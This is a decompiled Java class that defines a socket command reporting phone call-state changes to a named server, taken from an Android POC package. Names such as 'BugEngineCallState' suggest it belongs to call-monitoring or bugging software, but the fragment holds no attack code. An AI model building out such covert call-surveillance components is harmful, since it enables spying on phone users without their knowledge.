package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugEngineCallState;

public class RemoteNotifyOnCallStateChanged
  extends SocketCmd
{
  private static final long serialVersionUID = -7838003264380644804L;
  private String mServerName;
  
  public RemoteNotifyOnCallStateChanged(BugEngineCallState paramBugEngineCallState, String paramString)
  {
    super(paramBugEngineCallState, Boolean.class);
    this.mServerName = paramString;
  }
  
  protected String getServerName()
  {
    return this.mServerName;
  }
  
  protected String getTag()
  {
    return "RemoteNotifyOnCallStateChanged";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteNotifyOnCallStateChanged.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */